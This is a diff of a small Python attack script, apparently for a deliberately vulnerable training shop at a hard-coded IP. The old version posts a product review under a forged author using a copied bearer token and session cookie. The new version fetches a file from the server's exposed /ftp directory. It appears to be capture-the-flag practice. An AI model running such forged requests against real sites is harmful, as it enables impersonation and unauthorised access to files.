@@ -24,23 +24,27 @@ print(token)
 
 data = {"message": "Bumble bee man!", "author": "BumblebeeMan@kwike.mart"}
 data_json = json.dumps(data)
-headers = {'Content-type': 'application/json;charset=utf-8',
-           'X-User-Email': 'Homer@kwike.mart',
-           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
-           'Referer': 'http://43.241.202.33:3003/',
-           'Authorization': 'Bearer ' + token
-           }
-cookies = {'io': 'zajAOf3mZ3wQrtoDAAGt',
-           'cookieconsent_status': 'dismiss',
-           'email': 'Homer%40kwike.mart',
-           'token': token,
-           }
+headers = {
+    'Content-type': 'application/pdf;charset=utf-8',
+    'Accept': 'application/pdf',
+    'X-User-Email': 'Homer@kwike.mart',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
+    'Referer': 'http://43.241.202.33:3003/',
+    'Authorization': 'Bearer ' + token
+}
+cookies = {
+    'io': 'zajAOf3mZ3wQrtoDAAGt',
+    'cookieconsent_status': 'dismiss',
+    'email': 'Homer%40kwike.mart',
+    'token': token,
+}
 
-r = requests.put('http://43.241.202.33:3003/rest/product/9/reviews',
-                 data=data_json,
-                 headers=headers,
-                 cookies=cookies,
-                 )
+r = requests.get(
+    'http://43.241.202.33:3003/ftp/URL.wordlist',
+    data=data_json,
+    headers=headers,
+    cookies=cookies,
+)
 
 # if r.status_code == 200:
 print(r.status_code, r.url)
